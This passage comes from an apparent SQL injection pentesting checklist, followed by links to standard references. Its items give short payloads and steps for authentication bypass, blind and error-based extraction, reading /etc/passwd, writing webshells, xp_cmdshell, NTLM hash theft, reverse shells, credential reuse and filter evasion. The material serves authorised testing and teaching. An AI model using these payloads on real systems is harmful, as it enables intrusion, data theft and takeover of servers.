- [ ] Test JSON/XML body values
- [ ] Check for verbose SQL errors in responses
- [ ] Try time-based: `SLEEP(5)`, `WAITFOR DELAY`, `pg_sleep(5)`
- [ ] Identify DBMS from errors or fingerprint queries
- [ ] Determine injection context (numeric vs string)

### Authentication Bypass

- [ ] Try `' OR 1=1--` in both username and password fields
- [ ] Try `admin'--` in username (comment out password check)
- [ ] Try variations: `#`, `-- -`, `/*`, double quotes
- [ ] Try `' OR 1=1 LIMIT 1 OFFSET 0--` if wrong user returned

### UNION-Based

- [ ] Find number of columns (ORDER BY / UNION SELECT NULL)
- [ ] Find displayable columns (test string in each position)
- [ ] Extract: version, user, database
- [ ] Enumerate: databases → tables → columns → data
- [ ] Use CONCAT/GROUP_CONCAT for multi-column extraction

### Blind Boolean

- [ ] Confirm: `AND 1=1` vs `AND 1=2` show different responses
- [ ] Extract database name length
- [ ] Extract database name character by character
- [ ] Enumerate tables and columns
- [ ] Extract target data

### Blind Time-Based

- [ ] Confirm: `AND SLEEP(5)` causes delay
- [ ] Use conditional: `IF(condition, SLEEP(5), 0)`
- [ ] Extract data via time difference

### Error-Based

- [ ] Try `extractvalue()` / `updatexml()` (MySQL)
- [ ] Try `CONVERT(int, ...)` / `CAST(... AS int)` (MSSQL)
- [ ] Extract data from error messages

### File Operations

- [ ] Check FILE privilege (MySQL)
- [ ] Try `LOAD_FILE('/etc/passwd')`
- [ ] Try writing webshell with `INTO OUTFILE`
- [ ] Try alternative write methods per DBMS

### Command Execution

- [ ] MySQL: write webshell → access via HTTP
- [ ] MSSQL: enable and use `xp_cmdshell`
- [ ] MSSQL: steal NTLM hash via `xp_dirtree` to SMB
- [ ] PostgreSQL: `COPY ... TO PROGRAM`
- [ ] Get reverse shell from any RCE

### Escalation

- [ ] Crack extracted password hashes
- [ ] Try extracted creds on SSH, RDP, other services
- [ ] Check for password reuse across accounts
- [ ] Check for database links / linked servers (MSSQL)
- [ ] Pivot to internal hosts via DB connection

### Filter Bypass

- [ ] If spaces blocked → try `/**/`, `%09`, `%0a`, `()`
- [ ] If quotes blocked → try hex `0x`, `CHAR()`
- [ ] If keywords blocked → try case variation, inline comments
- [ ] If `=` blocked → try `LIKE`, `IN`, `BETWEEN`, `REGEXP`
- [ ] If commas blocked → try `JOIN`, `FROM...FOR`, `OFFSET`
- [ ] Try tamper scripts with sqlmap

### General

- [ ] Test for second-order SQLi (stored payloads)
- [ ] Check if stacked queries work (`;` followed by new query)
- [ ] Test for OUT-OF-BAND exfiltration (DNS, HTTP to your server)
- [ ] Document all findings with exact payloads that worked
- [ ] Save sqlmap output/logs as evidence

---

## 16. External References

- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [HackTricks — SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [SecLists — SQLi Payloads](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi)
- [pentestmonkey — SQL Injection Cheat Sheets](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
